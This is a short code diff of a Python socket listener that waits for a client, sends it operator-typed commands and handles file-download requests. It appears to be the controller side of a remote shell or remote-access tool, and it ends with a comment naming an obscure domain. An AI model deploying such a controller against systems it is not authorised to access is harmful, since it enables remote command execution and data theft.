@@ -10,7 +10,7 @@ class Socket:
     def __init__(self, ip_address, port):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.bind((ip_address, port))
-        self.socket.settimeout(4)
+        self.socket.settimeout(2.0)
         self.listen_to_for_client()
 
     def listen_to_for_client(self):
@@ -31,7 +31,7 @@ class Socket:
             self.established = False
             print(f"Lost connection to {self.address}")
             return False
-        if "-batch" in command.decode() or "cd.." in command.decode() or "cd" in command.decode():
+        if "-batch" in command.decode() or "cd.." in command.decode() or "cd" in command.decode() and "-cdrive" not in command.decode():
             return
         if "-download" in command.decode():
             name, ending = command.decode().split(".")
@@ -77,10 +77,11 @@ print("Download file -download file_name")
 while True:
     if not connection.established:
         connection.listen_to_for_client()
-    user_input = input("> ")
-    if user_input != ' ' and user_input != '':
-        connection.send_command(user_input)
-    sleep(1)
+    if connection.established:
+        user_input = input("> ")
+        if user_input != ' ' and user_input != '':
+            connection.send_command(user_input)
+        sleep(1)
 
 
 # uhblajkil.cf
